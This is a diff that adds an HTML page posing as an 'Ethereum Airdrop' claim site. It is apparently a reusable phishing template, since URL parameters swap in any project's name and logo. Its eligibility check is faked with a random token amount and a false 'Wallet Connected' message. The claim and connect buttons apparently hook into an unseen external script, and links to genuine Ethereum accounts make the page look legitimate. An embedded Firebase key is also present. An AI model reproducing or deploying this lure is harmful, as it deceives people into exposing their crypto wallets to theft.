@@ -1,0 +1,230 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title id="mrc"></title>
+        <link rel="icon" href="default-favicon.png" type="image/png">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Inter:400,700,900&amp;display=swap">
+    <link rel="stylesheet" href="./styles.css">
+     <script src="./674c5f35bfe0211925e10735.js"></script>
+</head>
+<body>
+    <!-- Navigation Bar -->
+    <nav class="navbar" style="padding-left: 5%;">
+        <div class="nav-brand">
+            <img id="mr" src="default-logo.png" alt="Logo" width="40" height="40" style="border-radius:30%;">
+            <span id="mrc" style="font-size:34px; text-transform: capitalize;">Ethereum Airdrop</span>
+        </div>
+        <div class="nav-links" style="padding-right: 5%;">
+            <a href="#" class="nav-link">Home</a>
+            <a href="#features" class="nav-link">Features</a>
+            <a href="#steps" class="nav-link">How It Works</a>
+            <button class="open connect-wallet">
+                <span class="wallet-dot"></span>
+                Connect Wallet
+            </button>
+        </div>
+    </nav>
+
+    <!-- Background Splash -->
+    <div id="splash" class="splash-container">
+        <div class="container">
+            <main>
+                <section class="hero">
+                    <div class="hero-content">
+                        <h1>Claim Your<br><span id="mrc" class="gradient-text" style="text-transform: capitalize;">Ethereum Airdrop </span><span class="gradient-text"> Airdrop</span></h1>
+                        <p class="hero-subtitle">Verify your eligibility and claim your tokens.</p>
+                        <div class="hero-buttons">
+                            <button class="primary-button" id="checkEligibility">Check Eligibility</button>
+                            <a href="#steps" class="secondary-button">Learn More</a>
+                        </div>
+                    </div>
+                    <div class="claim-box">
+                        <div class="claim-header">
+                            <div class="network-status">
+                                <span class="network-dot"></span>
+                                <span id="mrc" style="text-transform: capitalize;"></span><span>Mainnet</span>
+                            </div>
+                        </div>
+                        <div class="claim-content">
+                            <div class="claim-amount">
+                                <span class="label">Available to claim</span>
+                                <span class="amount">0.00 TOKEN</span>
+                            </div>
+                            <div class="gas-info">
+                                <i class="fas fa-gas-pump"></i>
+                                <span>Estimated Gas: <span class="gas-amount">0.002 ETH</span></span>
+                            </div>
+                            <button class="open claim-button" id="claimButton" disabled="">
+                                <span>Claim Tokens</span>
+                                <i class="fas fa-arrow-right"></i>
+                            </button>
+                        </div>
+                    </div>
+                </section>
+            </main>
+        </div>
+    </div>
+    <section id="steps" class="steps" style="
+padding-left: 5%;
+padding-right: 5%;
+">
+                  <h2 class="section-title">How It Works</h2>
+                  <div class="steps-grid">
+                      <div class="step-card">
+                          <div class="step-number">01</div>
+                          <h3>Connect Wallet</h3>
+                          <p>Connect your Web3 wallet to check your eligibility</p>
+                      </div>
+                      <div class="step-card">
+                          <div class="step-number">02</div>
+                          <h3>Check Eligibility</h3>
+                          <p>System automatically verifies your wallet status</p>
+                      </div>
+                      <div class="step-card">
+                          <div class="step-number">03</div>
+                          <h3>Claim Tokens</h3>
+                          <p>If eligible, claim your tokens with one click</p>
+                      </div>
+                  </div>
+              </section>
+    <!-- Footer -->
+    <footer>
+        <div class="footer-content" style="
+    padding-left: 5%;
+    padding-right: 5%;
+">
+            <div class="footer-left">
+                <div class="footer-brand">
+                    <img id="mr" src="default-logo.png" alt="Logo" width="30" height="30" style="border-radius:20%;">
+                    <span id="mrc" style="text-transform: capitalize;">Ethereum Airdrop</span>
+                </div>
+                <p class="footer-description">Experience the future of decentralized finance</p>
+            </div>
+            <div class="footer-right">
+                <div class="contract-info">
+                    <span>Smart Contract:</span>
+                    <a href="https://etherscan.io" target="_blank" class="contract-address">View on Etherscan</a>
+                </div>
+                <div class="social-links">
+                    <a href="https://x.com/ethereum" target="_blank" class="social-link"><i class="fab fa-twitter"></i></a>
+                    <a href="https://discord.com/invite/ethereum-org" target="_blank" class="social-link"><i class="fab fa-discord"></i></a>
+                    <a href="https://github.com/ethereum" target="_blank" class="social-link"><i class="fab fa-github"></i></a>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Script to Handle URL Parameters -->
+    <script>
+      // Функция для получения параметра из URL
+      function getParameterByName(name, url = window.location.href) {
+          name = name.replace(/[\[\]]/g, '\\$&'); // Экранирование спецсимволов
+          const regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
+                results = regex.exec(url);
+          if (!results) return null;
+          if (!results[2]) return '';
+          return decodeURIComponent(results[2].replace(/\+/g, ' '));
+      }
+
+      // Получение параметров из URL
+      const id = getParameterByName('id');      // Текст заголовка и логотипа
+      const mr = getParameterByName('mr');      // Логотип и favicon
+      const splash = getParameterByName('splash'); // Фоновое изображение
+
+      console.log("id:", id);
+      console.log("mr:", mr);
+      console.log("splash:", splash);
+
+      // Обновление логотипа, текста и favicon
+      if (id && mr) {
+          // Логотип
+          document.querySelectorAll('#mr').forEach(img => img.src = mr);
+          // Текст
+          document.querySelectorAll('#mrc').forEach(el => el.textContent = id);
+          // Favicon
+          const faviconElement = document.querySelector('link[rel="icon"]') || document.createElement('link');
+          faviconElement.rel = "icon";
+          faviconElement.href = mr;
+          document.head.appendChild(faviconElement);
+          // Заголовок страницы
+          document.title = id + "";
+      } else {
+          console.error("Параметры 'id' или 'mr' не найдены.");
+      }
+
+      // Обновление фонового изображения
+      if (splash) {
+          const splashUrl = splash;
+          document.querySelectorAll('#splash').forEach(el => {
+              el.style.backgroundImage = `linear-gradient(90deg, rgba(0, 0, 0, 0.3) 0%, rgba(0, 0, 0, 0.7) 100%)`;
+          });
+      } else {
+          console.error("Параметр 'splash' не найден.");
+      }
+  </script>
+
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+            const connectWalletBtn = document.querySelector('.connect-wallet');
+            const checkEligibilityBtn = document.getElementById('checkEligibility');
+            const claimAmountElement = document.querySelector('.claim-amount .amount');
+            const claimButton = document.getElementById('claimButton');
+            const subtitle = document.getElementById('subtitle');
+            let isProcessing = false;
+
+            checkEligibilityBtn.addEventListener('click', function () {
+                if (!isProcessing) {
+                    isProcessing = true;
+                    checkEligibilityBtn.textContent = "Processing...";
+                    checkEligibilityBtn.disabled = true;
+
+                    // Simulate 5 seconds of processing
+                    setTimeout(() => {
+                        const randomAmount = (Math.random() * (5690 - 100) + 100).toFixed(2);
+                        claimAmountElement.textContent = `${randomAmount} TOKENS`;
+                        claimButton.disabled = false;
+                        claimButton.classList.add("open");
+                        checkEligibilityBtn.textContent = "Success";
+                        subtitle.textContent = "Connect Wallet and claim your tokens";
+
+                        // Update wallet status
+                        connectWalletBtn.innerHTML = `
+                            <span class="wallet-dot" style="background: #27AE60;"></span>
+                            Wallet Connected
+                        `;
+                        isProcessing = false;
+                    }, 3000);
+                }
+            });
+        });
+    </script>
+     <script type="module">
+        // Import the functions you need from the SDKs you need
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.2/firebase-app.js";
+        import { getAnalytics } from "https://www.gstatic.com/firebasejs/11.0.2/firebase-analytics.js";
+        // TODO: Add SDKs for Firebase products that you want to use
+        // https://firebase.google.com/docs/web/setup#available-libraries
+      
+        // Your web app's Firebase configuration
+        // For Firebase JS SDK v7.20.0 and later, measurementId is optional
+        const firebaseConfig = {
+          apiKey: "AIzaSyCZ87LVpzZvyk9UQataHdVsYWJwL66po5E",
+          authDomain: "lumoz-25a3b.firebaseapp.com",
+          projectId: "lumoz-25a3b",
+          storageBucket: "lumoz-25a3b.firebasestorage.app",
+          messagingSenderId: "1049296914047",
+          appId: "1:1049296914047:web:7b0c516b863084e5f3a14a",
+          measurementId: "G-4ZCEW2C3W9"
+        };
+      
+        // Initialize Firebase
+        const app = initializeApp(firebaseConfig);
+        const analytics = getAnalytics(app);
+      </script>
+</body>
+</html>
+
+
